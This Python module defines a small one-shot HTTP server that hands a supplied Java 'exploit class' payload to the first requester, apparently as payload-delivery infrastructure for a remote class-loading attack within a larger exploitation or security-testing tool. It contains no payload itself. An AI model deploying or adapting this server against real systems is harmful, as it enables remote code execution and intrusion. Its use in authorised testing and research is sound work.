import http.server
import logging

logger = logging.getLogger(__name__)


class HTTPHandler(http.server.BaseHTTPRequestHandler):

    java_class: bytes
    class_downloaded = False

    @classmethod
    def reset(cls):
        cls.class_downloaded = False

    @classmethod
    def _set_class_downloaded(cls):
        cls.class_downloaded = True

    def do_GET(self):
        if HTTPHandler.class_downloaded:
            self.send_error(429, "Java exploit class has already been downloaded")
            return

        HTTPHandler._set_class_downloaded()
        logger.info("Java class servergot a GET request!")
        self.send_response(200)
        self.send_header("Content-type", "application/octet-stream")
        self.end_headers()
        logger.info("Sending the payload class!")
        self.wfile.write(self.java_class)


class ExploitClassHTTPServer:
    def __init__(self, ip: str, port: int, java_class: bytes):
        logger.debug(f"The Java Exploit class will be served at {ip}:{port}")

        HTTPHandler.java_class = java_class
        HTTPHandler.reset()

        self._server = http.server.HTTPServer((ip, port), HTTPHandler)
        self._server.socket.settimeout(0.5)

    def run(self):
        logger.debug("Starting ExploitClassHTTPServer")
        HTTPHandler.reset()

        self._server.serve_forever()
        logger.debug("The Java Exploit class HTTP server has stopped")

    def stop(self):
        logger.debug("Stopping the Java Exploit class HTTP server")
        self._server.shutdown()

    def exploit_class_downloaded(self) -> bool:
        return HTTPHandler.class_downloaded
